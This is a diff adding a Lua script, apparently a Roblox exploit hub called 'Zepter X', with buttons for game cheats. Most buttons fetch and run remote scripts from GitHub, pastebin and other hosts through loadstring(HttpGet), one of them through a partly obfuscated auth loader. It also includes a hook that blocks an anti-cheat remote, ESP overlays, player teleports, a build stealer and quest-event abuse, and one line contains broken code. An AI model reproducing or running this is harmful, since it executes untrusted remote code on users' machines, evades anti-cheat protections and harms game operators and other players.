@@ -1,0 +1,519 @@
+local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Patskorn/GUI/main/Copy-SynapOver.lua"))()
+
+local GUI = library:new("Zepter X","[ Exploits ]")
+
+local Tab1 = GUI:Tap("Fe Scripts")
+
+local Tab2 = GUI:Tap("Zepter Scripts")
+
+local Tab3 = GUI:Tap("Fe Scripts2")
+
+    Tab1:Button("Ghost Hub",function()
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
+
+end)
+
+Tab1:Button("FPS Counter",function()
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/littlegui/main/FPS-Counter'))()
+
+end)
+
+Tab1:Button("BABFT Build Stealer",function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StenDirt/Trash-Game/main/Script.lua"))()
+
+end)
+
+Tab1:Button("Tommy Play",function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsMe2/ToraIsMe2/main/%40tommy", true))()
+
+end)
+
+Tab1:Button("Roblo BABFT(PATCHED)",function()
+
+end)
+
+Tab1:Button("NTO HD(work some game)",function()
+
+-- NTO'S ADMIN
+
+-- Games : TOH, KOHLS ADMIN HOUSE (MORE WEEKLY)
+
+-- CREDITS : https://www.youtube.com/c/ntoexploits
+
+-- enjoy
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TwomadJR/nto/main/admiin"))()
+
+end)
+
+Tab1:Button("BABFT Bread",function()
+
+local args = {
+
+    [1] = 100
+
+}
+
+workspace.QuestMakerEvent:FireServer(unpack(args))
+
+end)
+
+Tab1:Button("Domain X",function()
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexsoftworks/Domain/main/source'),true))()
+
+--key = 2r0jfvlnjtq7
+
+end)
+
+Tab1:Button("Img loader BABFT",function()
+
+loadstring(game:HttpGet("https://dirtgui.xyz/ImageLoader.lua", true))()
+
+end)
+
+Tab1:Button("BABFT Farm + more",function()
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/XRoLLu/UWU/main/BUILD%20A%20BOAT%20FOR%20TREASURE.lua'))()
+
+end)
+
+Tab1:Button("DOORS Darkrai X",function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Doors"))()
+
+end)
+
+Tab1:Button("Comet X DOORS",function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAccelerator/CometRestoration/main/Main.lua"))()
+
+end)
+
+Tab1:Button("/e animation",function()
+
+end)
+
+Tab1:Button("Animation gui 1",function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/o5u3/emotesv2/main/script"))()
+
+end)
+
+Tab1:Button("Animation gui 2",function()
+
+loadstring(game:HttpGet("https://pastebin.com/raw/mbj17A7p"))()
+
+end)
+
+Tab1:Button("Animation gui 3",function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/broreallyplayingthisgame/whitelisted/main/RebirthChampionsX.lua"))()
+
+end)
+
+Tab1:Button("krnl",function()
+
+loadstring (game:HttpGet"https://pastebin.com/raw/vxymUED8")()
+
+end)
+
+Tab2:Button("BABFT&MM2",function()
+
+local DiscordLib = loadstring(game:HttpGet"https://raw.githubusercontent.com/dawid-scripts/UI-Libs/main/discord%20lib.txt")()
+
+local Win1 = DiscordLib:Window("Discord") -- Title/Name
+
+local Tab1 = Win1:Server("BABFT Script", "") -- Server/Tab
+
+local Tab2 = Win1:Server("Murder Mystery 2", "")
+
+local Tab3 = Win1:Server("More Coming Soon!", "")
+
+local Chann1 = Tab1:Channel("Babft Scripts") -- Channel 0_0
+
+local Chann2 = Tab1:Channel("Others")
+
+local Chann3 = Tab1:Channel("Teams TP")
+
+local Chann4 = Tab1:Channel("StenDirt Scripts")
+
+local Chann5 = Tab1:Channel("Old Quests")
+
+local Chann6 = Tab1:Channel("Babft Gui")
+
+local Chann7 = Tab2:Channel("Esclispse Hub")
+
+Chann1:Button("Auto Farm", function()
+
+DiscordLib:Notification("Notification", "Clicked", "Okay!")
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/XRoLLu/UWU/main/BUILD%20A%20BOAT%20FOR%20TREASURE.lua'))()
+
+end)
+
+Chann1:Button("Ghost Hub",function()
+
+DiscordLib: Notification ("Notification", "Clicked", "Okay!")
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()
+
+end)
+
+Chann1:Button("Keyboard",function()
+
+DiscordLib: Notification ("Notification", "Clicked", "Okay!")
+
+loadstring(game:HttpGet(('https://pastebin.com/raw/SxgKjiRT'),true))()
+
+end)
+
+Chann2:Button("Anti Cheat Bypass",function()
+
+DiscordLib: Notification ("Hey!", "Anti-Cheat Now Have No Affect To You!", "Okay!")
+
+local eventbypass
+
+eventbypass = hookmetamethod(game, "__namecall", function(self, ...)
+
+    local method = getnamecallmethod()
+
+    local args = {...}
+
+    if not checkcaller() and self.Name == "Anti_Cheat_Remote" and method == "FireServer" then
+
+        print("Anti Cheat remote was called and blocked.")
+
+        return wait(9e9); -- do nothing if called
+
+    end
+
+    return eventbypass(self, ...)
+
+end)
+
+end)
+
+Chann3:Button("White",function()
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-9, -10, -582)
+
+end)
+
+Chann3:Button("Red",function()
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(469, -10, -13)
+
+end)
+
+Chann3:Button("Black",function()
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-596, -10, -77)
+
+end)
+
+Chann3:Button("Blue",function()
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(479, -10, 311)
+
+end)
+
+Chann3:Button("Green",function()
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-582, -10, 262)
+
+end)
+
+Chann3:Button("Purple",function()
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(484, -10, 636)
+
+end)
+
+Chann3:Button("Yellow",function()
+
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-587, -10, 682)
+
+end)
+
+Chann4:Button("Image Loader",function()
+
+DiscordLib: Notification ("Notification", "Clicked", "Okay!")
+
+loadstring(game:HttpGet("https://dirtgui.xyz/ImageLoader.lua", true))()
+
+end)
+
+Chann4:Button("Copy Builds",function()
+
+DiscordLib: Notification ("Notification", "Clicked", "Okay!")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StenDirt/Trash-Game/main/Script.lua"))()
+
+end)
+
+Chann5:Button("Fabbi(Bread)",function()
+
+DiscordLib: Notification ("Hey!", "Quest Launched!", "Okay!")
+
+local args = {
+
+    [1] = 100
+
+}
+
+workspace.QuestMakerEvent:FireServer(unpack(args))
+
+end)
+
+Chann6:Button("Babft Gui (Token:ifree)",function()
+
+DiscordLib: Notification ("Notification", "Clicked", "Okay!")
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/rdpmakers/RoblosBabft/main/Login.txt'))()
+
+end)
+
+Chann7:Button("Esclispse GUI.1",function()
+
+DiscordLib: Notification ("Notification", "Clicked", "Okay!")
+
+getgenv().mainKey = "nil"
+
+local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth";c(a and b,"Executor not Supported")a(b({Url=e.."?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
+
+end)
+
+Chann7:Button("Esclispse GUI.2",function()
+
+DiscordLib: Notification ("Notification", "Clicked", "Okay!")
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/Script'),true))()
+
+end)
+
+Chann7:Button("Vynixu's MM2",function()
+
+DiscordLib: Notification ("Notification", "Clicked", "Okay!")
+
+loadstring(game:GetObjects("rbxassetid://4001118261")[1].Source)()
+
+end)
+
+Chann1:Seperator() -- Keep This If You Want To
+
+Chann1:Toggle("Toggle",false, function(bool)
+
+print(bool) -- Script The Toggle Executes
+
+end)
+
+local sldr = Chann1:Slider("Slide me!", 0, 1000, 400, function(t) -- A Slider
+
+print(t) -- Script The Slider Executes
+
+end)
+
+local drop = Chann1:Dropdown("Pick me!",{"Option 1","Option 2","Option 3","Option 4","Option 5"}, function(bool) -- A DropDown
+
+print(bool) -- You Know 0_o
+
+end)
+
+Chann1:Label("By Huh?#7792.") -- A Label (Ofc)
+
+end)
+
+Tab2:Button("TP Zepter X",function()
+
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+
+local Window = Library.CreateLib("Zepter X", "BloodTheme")
+
+local Tab = Window:NewTab("Players")
+
+local Section = Tab:NewSection("Teleport")
+
+--------------------
+
+players = {}
+
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+
+   table.insert(players,v.Name)
+
+end
+
+Section:NewDropdown("Select Player", "Select PPL To TP", players, function(abc)
+
+    Select = abc
+
+end)
+
+Section:NewButton("Refresh", "Refresh List", function()
+
+    table.clear(players)
+
+for i,v in pairs(game:GetService("Players"):GetChildren()) do
+
+   table.insert(players,v.Name)
+
+end
+
+end)
+
+Section:NewButton("Teleport", "TP To Selected Plr", function()
+
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[Select].Character.HumanoidRootPart.CFrame
+
+end)
+
+end)
+
+Tab2:Button("ESP",function()
+
+while wait() do
+
+   pcall(function()
+
+      for i,v in pairs(game.Players:GetChildren()) do
+
+      if not v.Character.Head:FindFirstChild("ESP") then
+
+       local VIP_ESP = Instance.new("BillboardGui")
+
+            local VIP_TextLabel = Instance.new("TextLabel")
+
+              VIP_ESP.Parent = v.Character.Head
+
+        VIP_ESP.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+                VIP_ESP.Active = true
+
+             VIP_ESP.Name = "ESP"
+
+          VIP_ESP.AlwaysOnTop = true
+
+            VIP_ESP.LightInfluence = 1.000
+
+                VIP_ESP.Size = UDim2.new(0, 200, 0, 50)
+
+               VIP_ESP.StudsOffset = Vector3.new(0, 2.5, 0)
+
+              VIP_TextLabel.Parent = VIP_ESP
+
+                VIP_TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+
+           VIP_TextLabel.BackgroundTransparency = 1.000
+
+                VIP_TextLabel.Size = UDim2.new(0, 200, 0, 50)
+
+        VIP_TextLabel.Font = Enum.Font.GothamBold
+
+                VIP_TextLabel.Text = v.Name
+
+          VIP_TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+                VIP_TextLabel.TextScaled = true
+
+       VIP_TextLabel.TextSize = 14.000
+
+                VIP_TextLabel.TextStrokeTransparency = 0.000
+
+          VIP_TextLabel.TextWrapped = true
+
+            end
+
+        end
+
+    end) 
+
+end
+
+end)
+
+Tab2:Button("M249(For Ambush Anti Cheat)",function()
+
+for i,v in next,game.Players.LocalPlayer:GetDescendants() do
+
+    if v.Name == "ItemShop_M249" then
+
+        v.Visible = true
+
+    end
+
+end
+
+end)
+
+Tab2:Button("(Lookman)Eyes Old Jumpscare",function()
+
+for i,v in next,game.Players.LocalPlayer:GetDescendants() do
+
+    if v.Name == "Jumpscare_Lookman" then
+
+        v.Visible = true
+
+    end
+
+end
+
+end)
+
+Tab2:Button("Disable Eyes Jumpscare",function()
+
+for i,v in next,game.Players.LocalPlayer:GetDescendants() do
+
+    if v.Name == "Jumpscare_Lookman" then
+
+        v.Visible = false
+
+    end
+
+end
+
+end)
+
+Tab2:Button("Delete Eyes",function()
+
+while wait() do
+
+game.Workspacs.Lookman:Destroy()
+
+end
+
+end)
+
+Tab3:Button("Ice Hub",function()
+
+loadstring(game:HttpGet"https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven")()
+
+end)
+
+Tab3:Button("Backdoor scanner",function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v6/source.lua"))()
+
+end)
+
+Tab3:Button("IV Admin",function()
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/BloodyBurns/Hexx/main/Iv%20Admin/Admin%202.lua'))()
+
+end)
+
+Tab3:Button("Keyboard V1",function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
+
+end)
+
+Tab3:Button("Yes Hub",function()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/yeshubb.txt",true))();
+
+end)
